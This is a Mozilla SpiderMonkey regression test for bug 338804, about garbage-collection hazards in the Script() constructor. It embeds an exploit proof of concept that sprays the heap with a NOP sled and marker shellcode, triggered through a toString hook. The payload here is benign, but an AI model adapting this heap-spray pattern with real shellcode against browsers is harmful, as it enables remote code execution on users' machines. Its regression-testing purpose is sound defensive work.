/* -*- Mode: C++; tab-width: 2; indent-tabs-mode: nil; c-basic-offset: 2 -*- */
/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//-----------------------------------------------------------------------------
var BUGNUMBER = 338804;
var summary = 'GC hazards in constructor functions';
var actual = 'No Crash';
var expect = 'No Crash';

printBugNumber(BUGNUMBER);
printStatus (summary);
printStatus ('Uses Intel Assembly');

// <script>
// SpiderMonkey Script() GC hazard exploit
//
// scale: magic number ;-)
//  BonEcho/2.0a2: 3000
//  Firefox/1.5.0.4: 2000
//
var rooter, scale = 2000;

exploit();
/*
  if(typeof(setTimeout) != "undefined") {
  setTimeout(exploit, 2000);
  } else {
  exploit();
  }
*/

function exploit() {
  if (typeof Script == 'undefined')
  {
    print('Test skipped. Script not defined.');
  }
  else
  {
    Script({ toString: fillHeap });
    Script({ toString: fillHeap });
  }
}

function createPayload() {
  var result = "\u9090", i;
  for(i = 0; i < 9; i++) {
    result += result;
  }
  /* mov eax, 0xdeadfeed; mov ebx, eax; mov ecx, eax; mov edx, eax; int3 */
  result += "\uEDB8\uADFE\u89DE\u89C3\u89C1\uCCC2";
  return result;
}

function fillHeap() {
  rooter = [];
  var payload = createPayload(), block = "", s2 = scale * 2, i;
  for(i = 0; i < scale; i++) {
    rooter[i] = block = block + payload;
  }
  for(; i < s2; i++) {
    rooter[i] = payload + i;
  }
  return "";
}

// </script>
 
reportCompare(expect, actual, summary);
